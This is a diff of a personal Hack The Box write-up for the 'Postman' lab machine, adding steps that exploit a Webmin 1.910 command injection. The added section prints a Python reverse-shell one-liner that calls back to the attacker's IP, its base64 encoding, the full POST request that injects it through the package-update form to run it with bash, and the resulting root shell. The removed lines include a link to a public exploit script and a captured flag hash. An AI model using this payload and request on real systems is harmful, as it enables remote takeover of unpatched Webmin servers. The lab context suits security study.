@@ -248,7 +248,9 @@ He is our user -- now need to figure out how to get a shell as him.
 
 ## RCE in wedmin update packages functionaly.  
 
-Googling quickly yeilds results for webmin 1.910, which is our version.  After logging into the service as Matt, I located the package update area of the app.  I captured a request to update one of the packages in burp:
+Googling quickly yeilds results for webmin 1.910, which is our version.  After logging into the service as Matt, I located the package update area of the app.  I captured a request to update one of the packages in burp and filled it in with content i found in the metasploit module for this version of webmin:
+
+https://www.exploit-db.com/exploits/46984
 
 ```
 POST /package-updates/update.cgi HTTP/1.1
@@ -284,6 +286,76 @@ Now updating <tt>acl  | id</tt> ..<br>
 No packages were installed. Check the messages above for the cause of the error.<p>
 ```
 
+Now will try to get a reverse shell:
+
+First, confirm we have python on the box
+```
+redis@Postman:/tmp$ python
+Python 2.7.15+ (default, Nov 27 2018, 23:36:35) 
+[GCC 7.3.0] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> 
+```
+Now that we do, grab reverse shell python code from pentestmonkey:
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+```
+shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ cat python_payload.txt 
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.41",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+Now we need to base64 encode the payload:
+```
+shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ cat python_payload.txt | base64 | tr -d '\r\n' && echo ''
+cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuNDEiLDkwMDEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOycK
+```
+Next we start a listener locally to recieve the call back:
+```
+shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ nc -lvnp 9001
+listening on [any] 9001 ...
+
+```
+Now we drop the base-64 encoded payload into the payload position in the post in burp
+
+```
+POST /package-updates/update.cgi HTTP/1.1
+Host: 10.10.10.160:10000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://10.10.10.160:10000/package-updates/update.cgi?xnavigation=1
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Progressive-URL: https://10.10.10.160:10000/package-updates/update.cgi
+X-Requested-From: package-updates
+X-Requested-From-Tab: webmin
+X-Requested-With: XMLHttpRequest
+Content-Length: 378
+Connection: close
+Cookie: redirect=1; testing=1; sid=dc687908de54c074d0b351994a557755
+
+u=acl%2Fapt&u=| echo -n "cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuNDEiLDkwMDEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOycK"|base64 -d|bash;&ok_top=Update+Selected+Packages
+```
+
+And if successful, it calls back to our listener - in this case giving us root before we even get the Matt user.  Just navigate a bit to find root's flag:
+```
+shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.41] from (UNKNOWN) [10.10.10.160] 58406
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# pwd
+/usr/share/webmin/package-updates/
+# cd /home/root
+/bin/sh: 3: cd: can't cd to /home/root
+# cd /root
+# ls
+redis-5.0.0
+root.txt
+
+```
+
 ## privesc to Matt
 
 it took me way too long to try it, but the same password we used to login into Webmin as Matt is his system user password.  Quick detail - his name is capitalized in the /home directory and that matters:
@@ -313,24 +385,4 @@ drwxrwxr-x 3 Matt Matt 4096 Aug 25 23:29 .local
 drwx------ 2 Matt Matt 4096 Aug 26 00:04 .ssh
 -rw-rw---- 1 Matt Matt   33 Aug 26 03:07 user.txt
 -rw-rw-r-- 1 Matt Matt  181 Aug 25 18:22 .wget-hsts
-```
-
-matt's ssh keys:
-```
-Matt@Postman:~/.ssh$ cat id_rsa.pub 
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkQvkxb79VUFMR/v9dirA8pYgDT4CLS+4LvQ8tQyATZ8pmd4HQz9BoVDNGeIZeBM2KpFF06+XIzlyCIbYBe2YFesNj/nI1i1TIYdS4ThG/xPFIr30CsLh5C9m4U4qRyinp6VDVX+lW7YQIKZqJdW4tWzd+7b3c/WaOFCIMzIPCXOZRKF5qCThO2Zoy0cDbxlwuC8jTu9sZjVo/8DQfiIMCDzoEyE5J0NTDa3GUWDxukYIGOzDL5NRy/T+06J+nvI0x54UTuIqvuTJ5hXkF/c+KupQ70nCqyi5SVktvU57iXoS51Ft9QyksKiYFEmszCo7oD1KTFWiMtg6sCDnRdPGt Matt@Postman
-```
-## exploit to root
-
-Turns out, once I had Matt's name and cracked password, I had everything I needed to run the following script.  In reality, I spent multiple hours trying to properly encode a perl reverse shell payload to call back to my kali machine as root.  I should have googled for exploits a bit more, since multiple people had already done the work.  Still glad I didn't have to use metasploit.  
-
-Plugged in the correct params for this guy:
-https://github.com/roughiz/Webmin-1.910-Exploit-Script
-
-and there was the shell:
-```
-whoami
-root
-cat /root/root.txt
-a257741c5bed8be7778c6ed95686ddce
 ```
